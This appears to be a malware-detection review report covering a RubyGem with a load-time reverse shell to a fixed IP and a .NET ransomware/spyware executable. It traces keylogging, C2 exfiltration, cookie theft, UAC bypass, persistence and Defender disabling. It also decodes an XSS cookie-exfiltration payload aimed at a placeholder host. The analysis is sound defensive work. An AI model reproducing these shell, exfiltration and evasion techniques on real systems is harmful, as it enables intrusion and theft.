method: Static first reasoned review. Read RULES.md and TAXONOMY.md. Ran atomscan in slow mode before/after and cleave facts on all originals and Ruby source/README members. Traced plain Ruby and all relevant .NET CIL including async MoveNext bodies using dnfile/dncil with resolved tokens. No specimen or mutated fixture was executed.

external_sources.ruby: https://github.com/advisories/GHSA-86pf-258h-xmh8 corroborates require-time shell, independently verified in both supplied versions.
external_sources.exe: Supplied Triage page was inaccessible via web. Judgment is based on the actual CIL, not the sandbox score.

changes: Preserve all original matchers, severities and operation requirements. Extend eight existing secondary-behavior composites to accept the already established managed ransom keyboard-recorder/form-POST profile as an alternative recorder admission. One additional read-profile alternative remains non-firing on this executable.
Add one file-scoped ransom-keylogger screenshot/JPEG reference composite in objectives/collection/screenshot. It asserts no screenshot upload or successful API execution.
No endpoint, campaign name, chosen output suffix or filename is required. No suppression, narrowing, severity reduction or deletion. Existing browser-copy read-profile exclusion remains intact.
consumer_review: Exact and ancestor YAML consumers inspected in scratch/ancestor-consumers.txt. Existing consumer IDs remain unchanged; new evidence is still keylogging, so their claims remain valid. New screenshot finding has no broad positive consumer requiring changes. All existing operation roles and scopes are retained.

tests.focused: 16 static original/mutated-PE and older-recorder controls passed. Each operation has a near miss; removing recording admission prevents every newly firing objective, ordinary administrative APIs do not convict, and endpoint/output renaming retains coverage.
tests.retained: 9 managed-records controls, 12 managed-ransom-first-review controls, and 15 plex-baileys-locker-review controls passed.
tests.stale_fixture: The older fallout-9520-8255-09a9 harness has a pre-existing fixture mismatch: its bare keylog label does not satisfy the unchanged keylog-keyboard-context matcher, which requires nearby keyboard vocabulary. No detection was weakened to satisfy it. The new controls exercise that retained branch using keylog keyboard, alongside the buffered-recorder branch.
tests.precision: Six focused debug traces report hostile-composite precision 9.4 through 14.8, above the 3.5 authoring floor. Static behavior and near misses, not the score, justify these detections.
tests.validation: make validate is the final action; its exit status is reported in the completion message.

samples.marker_line: zzhelloworld_socktest 0.1.8: load-time reverse shell; retain traits
samples.identification: zzhelloworld_socktest RubyGem 0.1.8; metadata claims derekiops and a test library; no runtime dependencies or install extensions.
execution_trace: lib/zzhelloworld_socktest.rb evaluates the module body on require. TCPSocket.new(host,port) connects to 66.78.40.218:32768; STDIN, STDOUT and STDERR reopen the same socket; exec("/bin/sh", "-i") replaces the host process with an interactive shell. No caller-selected endpoint, authentication or opt-in wrapper.
Version file, metadata and archive identify the supplied version. Rakefile is normal build/test tooling; SVG performs an alert. All hostile behavior is first-party Ruby, not a fetched dependency.

README contains an HTML/XSS parser-test corpus, Unicode and numeric entity encodings, a remote script tag, and eval(atob(...)). The Base64 literal decodes to document.location="http://listernIP/"+document.cookie. This documents cookie-transfer code to a placeholder listener hostname, not confirmed operational theft. Its decoder/eval, cookie, navigation and URL traits remain notable. Malformed smart quotes and browser sanitization may prevent particular markup from running.
samples.judgment_reason: An unbounded shell to a fixed public host upon library loading outweighs test/research wording. No controlled deployment or authorization is supplied. No installation-time execution is inferred.
samples.coverage_gap: Only one independent hostile behavior is established for the Ruby payload: a reverse shell. Retain the accurate hostile and eight notable observations; do not invent a second objective or duplicate the shell to meet the numeric minimum.
samples.classifier_disagreement: Outer package remains ML-alerted, but Ruby source and inner data.tar.gz have calibrated level -1 and probabilities about 0.004 or lower before and after, despite their hostile reverse-shell trait. This is a member classifier miss, not missing static shell detection.

samples.marker_line: ExtremeRansomwareBotnet: spying and lockout; expand coverage
samples.identification: Unsigned 50,688-byte x86 .NET WinForms executable with namespace ExtremeRansomwareBotnet. Version resource names socolivezaf.tv_hyber.exe, version 0.0.0.0. Family labels HiddenTears and blackcat are self-assigned strings, not verified attribution.
execution_trace: Entry MethodDef 0x0600001a Main (RVA 0x2354) creates a single-instance mutex and hidden/system work directory in CommonApplicationData/SysUpdate. It locks the workstation, shows a ransom form, blocks input, then invokes security-disabling, self-replication, persistence and surveillance code, directly or via task delegates.

HookCallback (MethodDef 0x26, RVA 0x34a8) tests WM_KEYDOWN, reads the virtual key, timestamps and appends Keys.ToString() records. StartKeylogger installs WH_KEYBOARD_LL and starts a second GetAsyncKeyState polling recorder. ClipboardMonitor.MoveNext (0x85, RVA 0x353c) reads Unicode clipboard content and appends changed content every two seconds.

ContinuousDataExfiltration.MoveNext (0xa2, RVA 0x5500) sends heartbeat/host identity, the last 1000 keylog characters and last 500 clipboard characters every 30 seconds. SendToC2.MoveNext (0xa4, RVA 0x5870) serializes supplied objects into a data form field and calls HttpClient.PostAsync on C2_URL. The static initializer sets C2_URL to http://socolivezaf.tv. No received-command dispatcher was established.

StealCookies.MoveNext (0x93, RVA 0x4da4) constructs LocalApplicationData/Google/Chrome/User Data/Default/Cookies, reads bytes, Base64 encodes, truncates to 5000 characters and sends a cookie record every 60 seconds. This is raw-store export, not password decryption or successful database access.

ReadBrowserData (0x35, RVA 0x4434) copies Cookies, History and Login Data to .stolen files. AccessWindowsCredentialManager copies files from Microsoft/Credentials without decrypting them. HighLevelFileStealer stages first-1024-byte snippets of selected documents/images/archives from Desktop, Documents and Downloads. ConstantDataScraping recursively reads qualifying drive files and sends truncated Base64 content.

ContinuousScreenshot (0x28, RVA 0x3778) uses CopyFromScreen, saves timestamped JPEG images locally, sleeps 30 seconds and repeats. No screenshot-to-HTTP linkage was established; the new trait describes capture/JPEG references only.

InstallPersistence writes the current executable into HKCU Run, copies it to the Startup folder and creates an onlogon scheduled task. MorePersistence adds RunOnce and a daily task; CreateStartupBat writes a self-launch batch. ActivateBotnetWhenPdfOpened (0x1e, RVA 0x2bd4) rewrites .pdf association and its open command to launch this executable with the selected file argument.

SelfReplicate and USBWorm copy self to multiple local locations and ready removable drives, set hidden/system attributes and create autorun.inf open entries. This supports USB propagation attempts; modern AutoRun restrictions can prevent activation. NetworkSpread targets only localhost/127.0.0.1 administrative shares and is not evidence of propagation to another network host.

DisableSecurityServices (0x37, RVA 0x4574) loops over Windows security/Defender services and launches sc stop/config start= disabled. Defender PowerShell is UTF-16LE/Base64 encoded at runtime, then launched with hidden/bypass flags. Other workers disable Defender registry policies, Task Manager, Registry Editor, System Restore and the firewall; remove SafeBoot Minimal/Network; and launch vssadmin/WMIC shadow deletion.

BlockAntivirusSites (0x38, RVA 0x4630) constructs SystemRoot/System32/drivers/etc/hosts and appends 127.0.0.1 redirects for security vendors and VirusTotal. SetRansomwareWallpaper writes ransom text onto an image, changes desktop registry values and invokes SystemParametersInfo action 20.

BypassUAC (0x3b, RVA 0x4878) sets HKCU Software/Classes/ms-settings/shell/open/command default value to its executable and DelegateExecute to empty, starts fodhelper.exe, and schedules cleanup. This is a concrete UAC hijack attempt, not merely an elevation request.

RealEncryption.MoveNext (0x81, RVA 0x2df4) enumerates Desktop/TestFolder recursively and attempts read -> EncryptAES -> suffixed WriteAllBytes -> Delete original. EncryptAES assigns UTF-8 HiddenTearsKey123 (15 bytes) and H1ddenT3ars1v!! (14 bytes) as AES key/IV. Invalid lengths throw before encrypted output/deletion; per-file catch swallows the failure. Existing traits correctly describe an attempted transform, not successful encryption.

PDF generation appends self as Base64 in pseudo-PDFs but creates no PDF exploit. A copied fake decryptor, persistent lock form, security-process termination and self-relaunch paths reinforce unwanted behavior. ProcessInjection targets notepad with a one-byte RET buffer: it exercises remote thread injection but no hidden RAT payload is inferred. Anti-debug APIs named in the assembly do not alone prove anti-analysis execution.
samples.judgment_reason: Simulation wording, test-folder targeting, dummy payment material and broken AES are meaningful benign clues. Nevertheless the unprompted public-host export of real key/clipboard/browser/file data, security-control tampering, persistent activation and screen lockout exceed a bounded simulator. No operator authorization or containment is supplied. A security engineer should treat it as malicious; successful encryption and known-family identity remain unproven.
samples.existing_high_severity_review: All six original hostile and fourteen suspicious findings were checked against the CIL. They describe ransom input/policy lockout, key-record/form-POST code, wallpaper defacement, attempted file replacement, labeled crypto/mutex ransom content, fodhelper hijack, security blocking/firewall/Defender commands, ransom text/note fields and shadow deletion. None requires successful encryption or a live C2. No original detection was weakened.
samples.coverage_gap: Actual clipboard/file/browser exfiltration, Run/Startup persistence and other mechanics are documented in this trace, but some do not have their own intent-specific firing trait. Existing notable capability findings remain; no unsupported bound-flow assertion or family signature was added.
samples.classifier_disagreement: Outer probability 0.98 and calibrated alert level 25 remain unchanged; human and outer classifier agree. Model logs warn that v18 models receive newer v19 feature inputs as zeros.
